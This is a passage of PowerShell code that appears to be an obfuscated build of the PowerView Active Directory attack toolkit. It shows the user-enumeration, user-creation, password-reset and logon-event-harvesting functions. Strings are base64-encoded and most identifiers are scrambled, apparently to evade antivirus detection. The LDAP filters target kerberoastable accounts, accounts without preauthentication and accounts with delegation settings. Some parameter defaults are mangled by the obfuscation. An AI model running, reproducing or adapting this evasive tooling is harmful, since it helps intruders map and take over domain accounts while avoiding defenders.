        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${__/\_______/\/=\/} = __/=\/\_/\/=\__/=\ @/=\___/=\__/=\/\/
    }
    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            _/=\/==\/\_/\__/== -CreateVariables -BoundParameters $PSBoundParameters
        }
        if (${__/\_______/\/=\/}) {
            ${_____/\_/\/=\/=\_} = ''
            $Filter = ''
            $Identity | ? {$_} | % {
                ${___/=\_/\/\__/===} = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                if (${___/=\_/\/\__/===} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAA==')))) {
                    ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABzAGkAZAA9ACQAewBfAF8AXwAvAD0AXABfAC8AXAAvAFwAXwBfAC8APQA9AD0AfQApAA==')))
                }
                elseif (${___/=\_/\/\__/===} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBDAE4APQA=')))) {
                    ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsAXwBfAF8ALwA9AFwAXwAvAFwALwBcAF8AXwAvAD0APQA9AH0AKQA=')))
                    if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                        ${/====\/==\_/=====} = ${___/=\_/\/\__/===}.SubString(${___/=\_/\/\__/===}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAEUAeAB0AHIAYQBjAHQAZQBkACAAZABvAG0AYQBpAG4AIAAnACQAewAvAD0APQA9AD0AXAAvAD0APQBcAF8ALwA9AD0APQA9AD0AfQAnACAAZgByAG8AbQAgACcAJAB7AF8AXwBfAC8APQBcAF8ALwBcAC8AXABfAF8ALwA9AD0APQB9ACcA')))
                        ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${/====\/==\_/=====}
                        ${__/\_______/\/=\/} = __/=\/\_/\/=\__/=\ @/=\___/=\__/=\/\/
                        if (-not ${__/\_______/\/=\/}) {
                            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFUAbgBhAGIAbABlACAAdABvACAAcgBlAHQAcgBpAGUAdgBlACAAZABvAG0AYQBpAG4AIABzAGUAYQByAGMAaABlAHIAIABmAG8AcgAgACcAJAB7AC8APQA9AD0APQBcAC8APQA9AFwAXwAvAD0APQA9AD0APQB9ACcA')))
                        }
                    }
                }
                elseif (${___/=\_/\/\__/===} -imatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbADAALQA5AEEALQBGAF0AewA4AH0ALQAoAFsAMAAtADkAQQAtAEYAXQB7ADQAfQAtACkAewAzAH0AWwAwAC0AOQBBAC0ARgBdAHsAMQAyAH0AJAA=')))) {
                    ${_/==\/\_/==\_/\/=} = (([Guid]${___/=\_/\/\__/===}).ToByteArray() | % { '\' + $_.ToString('X2') }) -join ''
                    ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7AF8ALwA9AD0AXAAvAFwAXwAvAD0APQBcAF8ALwBcAC8APQB9ACkA')))
                }
                elseif (${___/=\_/\/\__/===}.Contains('\')) {
                    ${________/==\/\/==} = ${___/=\_/\/\__/===}.Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA'))), '(').Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))), ')') | __/=\____/===\/==\ -_/=\/=\/==\/\_/=\_ Canonical
                    if (${________/==\/\/==}) {
                        $UserDomain = ${________/==\/\/==}.SubString(0, ${________/==\/\/==}.IndexOf('/'))
                        ${/=\/=\_/\_/\/\_/\} = ${___/=\_/\/\__/===}.Split('\')[1]
                        ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAPQAkAHsALwA9AFwALwA9AFwAXwAvAFwAXwAvAFwALwBcAF8ALwBcAH0AKQA=')))
                        ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $UserDomain
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAEUAeAB0AHIAYQBjAHQAZQBkACAAZABvAG0AYQBpAG4AIAAnACQAVQBzAGUAcgBEAG8AbQBhAGkAbgAnACAAZgByAG8AbQAgACcAJAB7AF8AXwBfAC8APQBcAF8ALwBcAC8AXABfAF8ALwA9AD0APQB9ACcA')))
                        ${__/\_______/\/=\/} = __/=\/\_/\/=\__/=\ @/=\___/=\__/=\/\/
                    }
                }
                else {
                    ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAPQAkAHsAXwBfAF8ALwA9AFwAXwAvAFwALwBcAF8AXwAvAD0APQA9AH0AKQA=')))
                }
            }
            if (${_____/\_/\/=\/=\_} -and (${_____/\_/\/=\/=\_}.Trim() -ne '') ) {
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACQAewBfAF8AXwBfAF8ALwBcAF8ALwBcAC8APQBcAC8APQBcAF8AfQApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBQAE4A')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFMAZQBhAHIAYwBoAGkAbgBnACAAZgBvAHIAIABuAG8AbgAtAG4AdQBsAGwAIABzAGUAcgB2AGkAYwBlACAAcAByAGkAbgBjAGkAcABhAGwAIABuAGEAbQBlAHMA')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGUAcgB2AGkAYwBlAFAAcgBpAG4AYwBpAHAAYQBsAE4AYQBtAGUAPQAqACkA')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwB3AEQAZQBsAGUAZwBhAHQAaQBvAG4A')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFMAZQBhAHIAYwBoAGkAbgBnACAAZgBvAHIAIAB1AHMAZQByAHMAIAB3AGgAbwAgAGMAYQBuACAAYgBlACAAZABlAGwAZQBnAGEAdABlAGQA')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAdQBzAGUAcgBBAGMAYwBvAHUAbgB0AEMAbwBuAHQAcgBvAGwAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQAxADAANAA4ADUANwA0ACkAKQA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAYQBsAGwAbwB3AEQAZQBsAGUAZwBhAHQAaQBvAG4A')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFMAZQBhAHIAYwBoAGkAbgBnACAAZgBvAHIAIAB1AHMAZQByAHMAIAB3AGgAbwAgAGEAcgBlACAAcwBlAG4AcwBpAHQAaQB2AGUAIABhAG4AZAAgAG4AbwB0ACAAdAByAHUAcwB0AGUAZAAgAGYAbwByACAAZABlAGwAZQBnAGEAdABpAG8AbgA=')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADEAMAA0ADgANQA3ADQAKQA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAEMAbwB1AG4AdAA=')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFMAZQBhAHIAYwBoAGkAbgBnACAAZgBvAHIAIABhAGQAbQBpAG4AQwBvAHUAbgB0AD0AMQA=')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABhAGQAbQBpAG4AYwBvAHUAbgB0AD0AMQApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AGUAZABUAG8AQQB1AHQAaAA=')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFMAZQBhAHIAYwBoAGkAbgBnACAAZgBvAHIAIAB1AHMAZQByAHMAIAB0AGgAYQB0ACAAYQByAGUAIAB0AHIAdQBzAHQAZQBkACAAdABvACAAYQB1AHQAaABlAG4AdABpAGMAYQB0AGUAIABmAG8AcgAgAG8AdABoAGUAcgAgAHAAcgBpAG4AYwBpAHAAYQBsAHMA')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABtAHMAZABzAC0AYQBsAGwAbwB3AGUAZAB0AG8AZABlAGwAZQBnAGEAdABlAHQAbwA9ACoAKQA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGUAYQB1AHQAaABOAG8AdABSAGUAcQB1AGkAcgBlAGQA')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFMAZQBhAHIAYwBoAGkAbgBnACAAZgBvAHIAIAB1AHMAZQByACAAYQBjAGMAbwB1AG4AdABzACAAdABoAGEAdAAgAGQAbwAgAG4AbwB0ACAAcgBlAHEAdQBpAHIAZQAgAGsAZQByAGIAZQByAG8AcwAgAHAAcgBlAGEAdQB0AGgAZQBuAHQAaQBjAGEAdABlAA==')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADQAMQA5ADQAMwAwADQAKQA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFUAcwBpAG4AZwAgAGEAZABkAGkAdABpAG8AbgBhAGwAIABMAEQAQQBQACAAZgBpAGwAdABlAHIAOgAgACQATABEAEEAUABGAGkAbAB0AGUAcgA=')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
            }
            $UACFilter | ? {$_} | % {
                if ($_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFQAXwAuACoA')))) {
                    ${/==\_/\______/=\/} = $_.Substring(4)
                    ${/=\_/=\/\__/==\/\} = [Int](${/==\_/\/\___/\___}::${/==\_/\______/=\/})
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAdQBzAGUAcgBBAGMAYwBvAHUAbgB0AEMAbwBuAHQAcgBvAGwAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQAkAHsALwA9AFwAXwAvAD0AXAAvAFwAXwBfAC8APQA9AFwALwBcAH0AKQApAA==')))
                }
                else {
                    ${/=\_/=\/\__/==\/\} = [Int](${/==\_/\/\___/\___}::$_)
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ACQAewAvAD0AXABfAC8APQBcAC8AXABfAF8ALwA9AD0AXAAvAFwAfQApAA==')))
                }
            }
            ${__/\_______/\/=\/}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAcwBhAG0AQQBjAGMAbwB1AG4AdABUAHkAcABlAD0AOAAwADUAMwAwADYAMwA2ADgAKQAkAEYAaQBsAHQAZQByACkA')))
            Write-Verbose "[Get-DomainUser] filter string: $(${__/\_______/\/=\/}.filter)"
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${/==\_/=\____/===\} = ${__/\_______/\/=\/}.FindOne() }
            else { ${/==\_/=\____/===\} = ${__/\_______/\/=\/}.FindAll() }
            ${/==\_/=\____/===\} | ? {$_} | % {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                    ${__/====\_/==\_/=\/} = $_
                    ${__/====\_/==\_/=\/}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBVAHMAZQByAC4AUgBhAHcA'))))
                }
                else {
                    ${__/====\_/==\_/=\/} = ____/=\__/\/=\__/= -Properties $_.Properties
                    ${__/====\_/==\_/=\/}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBVAHMAZQByAA=='))))
                }
                ${__/====\_/==\_/=\/}
            }
            if (${/==\_/=\____/===\}) {
                try { ${/==\_/=\____/===\}.dispose() }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAEUAcgByAG8AcgAgAGQAaQBzAHAAbwBzAGkAbgBnACAAbwBmACAAdABoAGUAIABSAGUAcwB1AGwAdABzACAAbwBiAGoAZQBjAHQAOgAgACQAXwA=')))
                }
            }
            ${__/\_______/\/=\/}.dispose()
        }
    }
}
function New-DomainUser {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $SamAccountName,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $AccountPassword,
        [ValidateNotNullOrEmpty()]
        [String]
        $Name,
        [ValidateNotNullOrEmpty()]
        [String]
        $DisplayName,
        [ValidateNotNullOrEmpty()]
        [String]
        $Description,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    ${_/\/\__/=\__/\_/\} = @{
        'Identity' = $SamAccountName
    }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/\/\__/=\__/\_/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/\__/=\__/\_/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    ${/====\/\/\______/} = ___/\__/===\__/\__ @_/\/\__/=\__/\_/\
    if (${/====\/\/\______/}) {
        ${__/====\_/==\_/=\/} = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList (${/====\/\/\______/}.Context)
        ${__/====\_/==\_/=\/}.SamAccountName = ${/====\/\/\______/}.Identity
        ${___/=\/\/==\_/=\/} = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
        ${__/====\_/==\_/=\/}.SetPassword(${___/=\/\/==\_/=\/}.GetNetworkCredential().Password)
        ${__/====\_/==\_/=\/}.Enabled = $True
        ${__/====\_/==\_/=\/}.PasswordNotRequired = $False
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA=')))]) {
            ${__/====\_/==\_/=\/}.Name = $Name
        }
        else {
            ${__/====\_/==\_/=\/}.Name = ${/====\/\/\______/}.Identity
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAcABsAGEAeQBOAGEAbQBlAA==')))]) {
            ${__/====\_/==\_/=\/}.DisplayName = $DisplayName
        }
        else {
            ${__/====\_/==\_/=\/}.DisplayName = ${/====\/\/\______/}.Identity
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA==')))]) {
            ${__/====\_/==\_/=\/}.Description = $Description
        }
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAGUAdwAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAEEAdAB0AGUAbQBwAHQAaQBuAGcAIAB0AG8AIABjAHIAZQBhAHQAZQAgAHUAcwBlAHIAIAAnACQAUwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlACcA')))
        try {
            $Null = ${__/====\_/==\_/=\/}.Save()
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAGUAdwAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFUAcwBlAHIAIAAnACQAUwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlACcAIABzAHUAYwBjAGUAcwBzAGYAdQBsAGwAeQAgAGMAcgBlAGEAdABlAGQA')))
            ${__/====\_/==\_/=\/}
        }
        catch {
            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAGUAdwAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAEUAcgByAG8AcgAgAGMAcgBlAGEAdABpAG4AZwAgAHUAcwBlAHIAIAAnACQAUwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlACcAIAA6ACAAJABfAA==')))
        }
    }
}
function Set-DomainUserPassword {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('UserName', 'UserIdentity', 'User')]
        [String]
        $Identity,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $AccountPassword,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    ${_/\/\__/=\__/\_/\} = @{ 'Identity' = $Identity }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/\/\__/=\__/\_/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/\__/=\__/\_/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    ${/====\/\/\______/} = ___/\__/===\__/\__ @_/\/\__/=\__/\_/\
    if (${/====\/\/\______/}) {
        ${__/====\_/==\_/=\/} = [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity(${/====\/\/\______/}.Context, $Identity)
        if (${__/====\_/==\_/=\/}) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBTAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAUABhAHMAcwB3AG8AcgBkAF0AIABBAHQAdABlAG0AcAB0AGkAbgBnACAAdABvACAAcwBlAHQAIAB0AGgAZQAgAHAAYQBzAHMAdwBvAHIAZAAgAGYAbwByACAAdQBzAGUAcgAgACcAJABJAGQAZQBuAHQAaQB0AHkAJwA=')))
            try {
                ${___/=\/\/==\_/=\/} = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
                ${__/====\_/==\_/=\/}.SetPassword(${___/=\/\/==\_/=\/}.GetNetworkCredential().Password)
                $Null = ${__/====\_/==\_/=\/}.Save()
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBTAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAUABhAHMAcwB3AG8AcgBkAF0AIABQAGEAcwBzAHcAbwByAGQAIABmAG8AcgAgAHUAcwBlAHIAIAAnACQASQBkAGUAbgB0AGkAdAB5ACcAIABzAHUAYwBjAGUAcwBzAGYAdQBsAGwAeQAgAHIAZQBzAGUAdAA=')))
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBTAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAUABhAHMAcwB3AG8AcgBkAF0AIABFAHIAcgBvAHIAIABzAGUAdAB0AGkAbgBnACAAcABhAHMAcwB3AG8AcgBkACAAZgBvAHIAIAB1AHMAZQByACAAJwAkAEkAZABlAG4AdABpAHQAeQAnACAAOgAgACQAXwA=')))
            }
        }
        else {
            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBTAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAUABhAHMAcwB3AG8AcgBkAF0AIABVAG4AYQBiAGwAZQAgAHQAbwAgAGYAaQBuAGQAIAB1AHMAZQByACAAJwAkAEkAZABlAG4AdABpAHQAeQAnAA==')))
        }
    }
}
function ___/\_/=\/\/\/\___ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogonEvent')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${____/=\/=\_/=\/\/} = ${Env:____/=\/=\_/=\/\/},
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${__/\/=\__/====\/=\} = [DateTime]::Now.AddDays(-1),
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${__/\____/=\_/\_/=\} = [DateTime]::Now,
        [ValidateRange(1, 1000000)]
        [Int]
        $MaxEvents = 5000,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${_/====\_/\_/\/=\/} = @"
<QueryList>
    <Query Id="0" Path="Security">

        <!-- Logon events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4624)
                    and TimeCreated[
                        @SystemTime&gt;='$(${__/\/=\__/====\/=\}.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$(${__/\____/=\_/\_/=\}.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
            and
            *[EventData[Data[@Name='TargetUserName'] != 'ANONYMOUS LOGON']]
        </Select>

        <!-- Logon with explicit credential events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4648)
                    and TimeCreated[
                        @SystemTime&gt;='$(${__/\/=\__/====\/=\}.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$(${__/\____/=\_/\_/=\}.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
        </Select>

        <Suppress Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and
                    (Level=4 or Level=0) and (EventID=4624 or EventID=4625 or EventID=4634)
                ]
            ]
            and
            *[
                EventData[
                    (
                        (Data[@Name='LogonType']='5' or Data[@Name='LogonType']='0')
                        or
                        Data[@Name='TargetUserName']='ANONYMOUS LOGON'
                        or
                        Data[@Name='TargetUserSID']='S-1-5-18'
                    )
                ]
            ]
        </Suppress>
    </Query>
</QueryList>
"@
        ${__/=\/=\_/\_____/} = @{
            'FilterXPath' = ${_/====\_/\_/\/=\/}
            'LogName' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AA==')))
            'MaxEvents' = $MaxEvents
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${__/=\/=\_/\_____/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        ForEach (${__/\__/\/\_/=====} in ${____/=\/=\_/=\/\/}) {
            ${__/=\/=\_/\_____/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))] = ${__/\__/\/\_/=====}
            Get-WinEvent @__/=\/=\_/\_____/| % {
                ${/\________/=====\} = $_
                $Properties = ${/\________/=====\}.Properties
                Switch (${/\________/=====\}.Id) {
                    4624 {
                        if(-not $Properties[5].Value.EndsWith('$')) {
                            ${__/\/\/\_/\/\/=\/} = New-Object PSObject -Property @{
                                ComputerName              = ${__/\__/\/\_/=====}
                                TimeCreated               = ${/\________/=====\}.TimeCreated
                                EventId                   = ${/\________/=====\}.Id
                                SubjectUserSid            = $Properties[0].Value.ToString()
